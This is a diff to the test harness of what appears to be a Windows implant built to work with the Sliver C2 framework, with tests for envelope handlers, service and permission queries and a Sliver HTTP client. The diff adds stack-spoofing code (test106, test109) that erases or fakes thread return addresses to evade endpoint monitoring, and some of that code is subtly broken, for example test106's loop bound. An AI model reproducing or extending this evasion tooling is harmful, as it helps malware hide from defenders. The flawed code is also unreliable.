 	PENVELOPE pEnvelope = NULL;
 	PENVELOPE pRespEnvelope = NULL;
 
@@ -1395,7 +1395,7 @@ void test80() {
 	FreeEnvelope(pRespEnvelope);
 }
 
-void test81() {
+void test81(void) {
 	HKEY hKey = NULL;
 	LSTATUS Status = ERROR_SUCCESS;
 
@@ -1406,7 +1406,7 @@ void test81() {
 	}
 }
 
-void test82() {
+void test82(void) {
 	BYTE Data[] = { 10, 19, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 48, 52, 53, 53, 97, 56, 49, 102, 45, 101, 102, 102, 101, 45, 52, 56, 100, 97, 45, 57, 102, 99, 99, 45, 99, 51, 51, 102, 56, 97, 54, 52, 56, 100, 101, 97 };
 	PENVELOPE pRespEnvelope = NULL;
 	PENVELOPE pEnvelope = ALLOC(sizeof(ENVELOPE));
@@ -1416,13 +1416,13 @@ void test82() {
 	pRespEnvelope = IcaclsHandler(pEnvelope);
 	FreeEnvelope(pRespEnvelope);
 }
-void test83() {
+void test83(void) {
 	LPSTR lpOwner = GetFileOwner(L"C:\\Users\\Admin\\Desktop");
 	PrintFormatA("%s\n", lpOwner);
 	FREE(lpOwner);
 }
 
-void test84() {
+void test84(void) {
 	WCHAR wszBuffer[] = L"Advapi32.dll\0";
 	BYTE Key[] = { 0x5c, 0xf6, 0xee, 0x79, 0x2c, 0xdf, 0x5, 0xe1, 0xba, 0x2b, 0x63, 0x25, 0xc4, 0x1a, 0x5f, 0x10 };
 	BYTE Nonce[] = { 0x31, 0x7a, 0xae, 0x7, 0x69, 0xad, 0xab, 0x88 };
@@ -1433,7 +1433,7 @@ void test84() {
 	HexDump(wszBuffer, sizeof(wszBuffer));
 }
 
-void test85() {
+void test85(void) {
 	LPWSTR lpPath = NULL;
 
 	lpPath = GetTargetShortcutFile(L"C:\\Users\\Admin\\Desktop\\Apps\\AULA F75.lnk");
@@ -1441,7 +1441,7 @@ void test85() {
 	FREE(lpPath);
 }
 
-void test86() {
+void test86(void) {
 	LPWSTR lpPath = NULL;
 
 	lpPath = GetSymbolLinkTargetPath(L"C:\\Users\\Admin\\Downloads\\Apps");
@@ -1449,7 +1449,7 @@ void test86() {
 	FREE(lpPath);
 }
 
-void test87() {
+void test87(void) {
 	DWORD dwFileAttribute = GetFileAttributesW(L"C:\\Users\\Admin\\Desktop\\Debug");
 	if (dwFileAttribute & FILE_ATTRIBUTE_DIRECTORY) {
 		PrintFormatW(L"Is Folder\n");
@@ -1458,7 +1458,7 @@ void test87() {
 	return;
 }
 
-void test88() {
+void test88(void) {
 	HMODULE hModule = NULL;
 
 	hModule = LoadLibraryW(L"kernel32.dll");
@@ -1466,7 +1466,7 @@ void test88() {
 	PrintFormatW(L"hModule: %p, lpProc: %p\n", hModule, lpProc);
 }
 
-void test89() {
+void test89(void) {
 	WCHAR wszFullPath[MAX_PATH];
 	LPWSTR lpFilePart = NULL;
 
@@ -1474,7 +1474,7 @@ void test89() {
 	PrintFormatW(L"wszFullPath: %s\n", wszFullPath);
 }
 
-void test90() {
+void test90(void) {
 	TIME_ZONE_INFORMATION TimeZone;
 	CHAR szTimeZone[0x10];
 
@@ -1490,7 +1490,7 @@ void test90() {
 }
 
 #define FILETIME_TO_UNIXTIME(ft) (UINT)((*(LONGLONG*)&(ft)-116444736000000000)/10000000)
-void test91() {
+void test91(void) {
 	WCHAR lpPath[] = L"C:\\Users\\Admin\\Downloads\\Firefox Installer.exe";
 	UINT64 uModifiedTime = 0;
 	HANDLE hFile = INVALID_HANDLE_VALUE;
@@ -1514,7 +1514,7 @@ void test91() {
 	PrintFormatW(L"%lu\n", (DWORD)uModifiedTime);
 }
 
-void test92() {
+void test92(void) {
 	BYTE Buffer[] = { 73, 110, 116, 101, 108, 194, 174, 32, 83, 109, 97, 114, 116 };
 	WCHAR wszOutput[0x100];
 
@@ -1523,7 +1523,7 @@ void test92() {
 	PrintFormatW(L"%d: wszOutput: %s\n", wszOutput);
 }
 
-void test93() {
+void test93(void) {
 	BYTE Buffer[] = { 10, 21, 10, 8, 65, 120, 73, 110, 115, 116, 83, 86, 18, 9, 108, 111, 99, 97, 108, 104, 111, 115, 116, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 99, 49, 97, 52, 97, 52, 53, 100, 45, 101, 102, 51, 54, 45, 52, 51, 97, 54, 45, 57, 52, 55, 100, 45, 55, 102, 57, 97, 50, 55, 98, 56, 102, 49, 50, 56 };
 	ENVELOPE Envelope;
 
@@ -1533,14 +1533,14 @@ void test93() {
 	ServiceDetailHandler(&Envelope);
 }
 
-void test94() {
+void test94(void) {
 	CHAR szMessage[] = "Hello World";
 	PENVELOPE pRespEnvelope = CreateErrorRespEnvelope(szMessage, 9, 0);
 
 	HexDump(pRespEnvelope->pData->pBuffer, pRespEnvelope->pData->cbBuffer);
 }
 
-void test95() {
+void test95(void) {
 	BYTE szBuffer[] = { 10, 41, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 92, 105, 99, 97, 99, 108, 115, 46, 101, 120, 101, 32, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 24, 1, 34, 26, 67, 58, 85, 115, 101, 114, 115, 65, 100, 109, 105, 110, 68, 101, 115, 107, 116, 111, 112, 108, 111, 103, 46, 116, 120, 116, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 101, 99, 100, 99, 100, 54, 98, 56, 45, 97, 52, 56, 54, 45, 52, 99, 99, 56, 45, 98, 57, 99, 52, 45, 50, 57, 97, 101, 98, 55, 97, 100, 99, 51, 53, 101 };
 	ENVELOPE Envelope;
 	PENVELOPE pRespEnvelope = NULL;
@@ -1554,19 +1554,19 @@ void test95() {
 	FreeEnvelope(pRespEnvelope);
 }
 
-void test96() {
+void test96(void) {
 	DeletePath(L"C:\\Users\\Admin\\Desktop\\Hello\\");
 }
 
-void test97() {
+void test97(void) {
 	//UnzipBuffer("C:\\Users\\Admin\\Desktop\\Hello.7z");
 }
 
-void test98() {
+void test98(void) {
 	Unzip(L"C:\\Users\\Admin\\Desktop\\Test.zip", L"C:\\Users\\Admin");
 }
 
-void test99() {
+void test99(void) {
 	if (IsFolderExist(L"..\\Removerr")) {
 		PrintFormatW(L"Folder exist\n");
 	}
@@ -1575,11 +1575,11 @@ void test99() {
 	}
 }
 
-void test100() {
+void test100(void) {
 	CompressPathByGzip(L"..\\..\\Desktop\\Folder", NULL);
 }
 
-void test101() {
+void test101(void) {
 	PSLIVER_HTTP_CLIENT pSliverClient = NULL;
 	PBYTE pMarshalledRegisterInfo = NULL;
 	DWORD cbMarshalledRegisterInfo = 0;
@@ -1613,28 +1613,97 @@ CLEANUP:
 	return;
 }
 
-void test102() {
+void test102(void) {
 	PrintFormatW(L"Hello %d 0x%08x\n\n\n", 1, 2);
 }
 
-void test103() {
+void test103(void) {
+	WCHAR wszHello[] = L"Hello";
+	LPWSTR lpPointer = NULL;
+
 	DWORD dwIdx = TlsAlloc();
-	PrintFormatW(L"Idx: %d\n", dwIdx);
-	dwIdx = TlsAlloc();
-	PrintFormatW(L"Idx: %d\n", dwIdx);
-	dwIdx = TlsAlloc();
-	PrintFormatW(L"Idx: %d\n", dwIdx);
-	dwIdx = TlsAlloc();
-	PrintFormatW(L"Idx: %d\n", dwIdx);
-	dwIdx = TlsAlloc();
-	PrintFormatW(L"Idx: %d\n", dwIdx);
+	PrintFormatW(L"Idx: 0x%08x\n", dwIdx);
+	TlsSetValue(dwIdx, wszHello);
+	lpPointer = (LPWSTR)TlsGetValue(dwIdx);
+	PrintFormatW(L"Value: %s\n", lpPointer);
 }
 
-void test104() {
+void test104(void) {
 	DWORD dwThreadId = 0;
 	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)test103, NULL, 0, &dwThreadId);
 	WaitForSingleObject(hThread, INFINITE);
 	CloseHandle(hThread);
+}
+
+void test106(void) {
+	HANDLE hKernel32 = NULL;
+	HANDLE hImage = NULL;
+	LPVOID lpBaseThreadInitThunk = NULL;
+	DWORD cbBaseThreadInitThunk = 0;
+	PIMAGE_DOS_HEADER pDosHdr = NULL;
+	PIMAGE_NT_HEADERS64 pNtHdr = NULL;
+	PIMAGE_OPTIONAL_HEADER64 pOptionalHdr = NULL;
+	DWORD dwExceptionDirRva = 0;
+	DWORD cbExceptionDir = 0;
+	PRUNTIME_FUNCTION pRuntimeFunc = NULL;
+	LPVOID lpStartFunc = NULL;
+	DWORD i = 0;
+	PUINT64 pStackAddr = NULL;
+	MEMORY_BASIC_INFORMATION64 MemInfo;
+	UINT64 uStackValue = 0;
+
+	hKernel32 = GetModuleHandleA("kernel32.dll");
+	if (hKernel32 == NULL) {
+		goto CLEANUP;
+	}
+
+	lpBaseThreadInitThunk = GetProcAddress(hKernel32, "BaseThreadInitThunk");
+	hImage = GetModuleHandleA(NULL);
+	pDosHdr = (PIMAGE_DOS_HEADER)hKernel32;
+	pNtHdr = (PIMAGE_NT_HEADERS64)((ULONG_PTR)pDosHdr + pDosHdr->e_lfanew);
+	pOptionalHdr = (PIMAGE_FILE_HEADER)&pNtHdr->OptionalHeader;
+	dwExceptionDirRva = pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
+	cbExceptionDir = pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
+	for (i = 0; i < cbExceptionDir; i += sizeof(RUNTIME_FUNCTION)) {
+		pRuntimeFunc = (PRUNTIME_FUNCTION)((ULONG_PTR)hKernel32 + dwExceptionDirRva + i);
+		lpStartFunc = (LPVOID)((ULONG_PTR)hKernel32 + pRuntimeFunc->BeginAddress);
+		if (lpStartFunc == lpBaseThreadInitThunk) {
+			cbBaseThreadInitThunk = pRuntimeFunc->EndAddress - pRuntimeFunc->BeginAddress;
+			break;
+		}
+	}
+
+	pStackAddr = (PUINT64)_AddressOfReturnAddress();
+	SecureZeroMemory(&MemInfo, sizeof(MemInfo));
+	if (VirtualQuery((LPVOID)pStackAddr, &MemInfo, sizeof(MemInfo)) == 0) {
+		goto CLEANUP;
+	}
+
+	for (i = 0; i < MemInfo.BaseAddress + MemInfo.RegionSize; i += sizeof(UINT64)) {
+		uStackValue = *(PUINT64)((ULONG_PTR)pStackAddr + i);
+		if (uStackValue > (UINT64)lpBaseThreadInitThunk && uStackValue < (UINT64)lpBaseThreadInitThunk + cbBaseThreadInitThunk) {
+			*(PUINT64)((ULONG_PTR)pStackAddr + i) = 0;
+			break;
+		}
+	}
+
+CLEANUP:
+	return;
+}
+
+void test107() {
+	PrintFormatW(L"Hello World");
+}
+
+int test108(void) {
+	int a = 1;
+	int b = 1;
+	test107();
+	return a + b;
+}
+
+void test109(void) {
+	StackSpoofing(PrintFormatA, 5, "Hello %s, ID: %d, address: %p, hex value: 0x%08x", "Dat", 10, test109, 20);
 }
 
 VOID DetectMonitorSystem(VOID)
@@ -1673,12 +1742,12 @@ LONG VectoredExceptionHandler
 {
 	DWORD dwExpceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
 
-	PrintFormatW(L"Exception Code: %d\n", dwExpceptionCode);
+	PrintFormatW(L"Exception Code: 0x%08x\n", dwExpceptionCode);
 	PrintStackTrace(ExceptionInfo->ContextRecord);
 	ExitProcess(-1);
 }
 
-int main() {
+int main(void) {
 	RtlAddVectoredExceptionHandler(1, VectoredExceptionHandler);
 	LoadLibraryW(L"advapi32.dll");
 	LoadLibraryW(L"bcrypt.dll");
@@ -1799,6 +1868,9 @@ int main() {
 	//test101();
 	//test102();
 	//test103();
-	test104();
+	//test104();
+	//test106();
+	//test108();
+	test109();
 	return 0;
 }
